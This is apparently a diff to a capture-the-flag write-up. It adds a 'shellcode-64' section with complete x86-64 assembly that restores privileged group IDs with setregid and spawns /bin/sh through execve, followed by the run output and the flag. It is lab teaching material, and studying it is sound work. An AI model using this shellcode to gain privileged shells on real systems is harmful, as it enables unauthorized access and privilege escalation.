@@ -27,7 +27,7 @@ make 64:
 The binary took `shellcode.bin` and used it to run our code, and then we had a privileged shell
 that would allow us to get the flag. 
 
-# 32bit
+# Simple Shellcode
 ## shellcode-32
 For this challenge, we just had to write any 32bit shellcode that would accomplish the goal. 
 All this required was the general system call calling conventions. THe first call is the 
@@ -130,4 +130,47 @@ $ cat flag
 cand{execve_bin_sh}
 ```
 
+## shellcode-64
+This challenge is essentially the same as shellcode-32, just in 64bit. The main
+difference here is the system call numbers, the registers that arguments are passed in, and how
+the system calls are made. Because we are using `<sys/syscall.h>` we can ignore the numbers themselves
+and just use the variables. The arguments are passed in the same registers as in the usual 64bit assembly. 
+And instead of using `int 0x80`, we use `syscall`. We also can't directly push variables onto the stack,
+so we move them into a register and then push the register. 
 
+### Full Script + Solving
+```gas
+#include <sys/syscall.h>
+
+.globl main
+.type main, @function
+
+main:
+    // getegid()
+    mov $SYS_getegid, %rax
+    syscall
+
+    // setregid(getegid(), getegid())
+    mov %rax, %rdi
+    mov %rax, %rsi
+    mov $SYS_setregid, %rax
+    syscall
+
+    // ececve("/bin/sh", 0, 0)
+    mov $0, %rax
+    push %rax
+    mov $0x68732f6e69622f2f, %rax
+    push %rax
+    mov $SYS_execve, %rax
+    mov %rsp, %rdi
+    mov $0, %rsi
+    mov $0, %rdx
+    syscall
+```
+```
+$ ./shellcode-64
+Reading shellcode from shellcode.bin
+
+$ cat flag
+cand{exEcvE_b1n_5h}
+```
